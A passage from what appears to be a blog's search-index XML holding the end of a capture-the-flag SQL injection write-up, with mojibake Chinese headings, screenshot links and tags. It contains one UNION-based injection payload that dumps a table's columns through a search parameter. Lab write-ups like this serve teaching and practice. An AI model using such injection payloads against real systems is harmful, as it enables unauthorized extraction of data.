src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220408104548291.png" alt="image-20220408104548291"></p><p>çˆ†å­—æ®µ</p><pre class="language-none"><code class="language-none">search&#x3D;amazonis_planitia+union+select+1,group_concat(id,code)+from+alien_code.code</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220408104808831.png" alt="image-20220408104808831"></p>]]></content>
      
      
      
        <tags>
            
            <tag> webå­¦ä¹  </tag>
            
            <tag> sqlæ³¨å…¥ </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
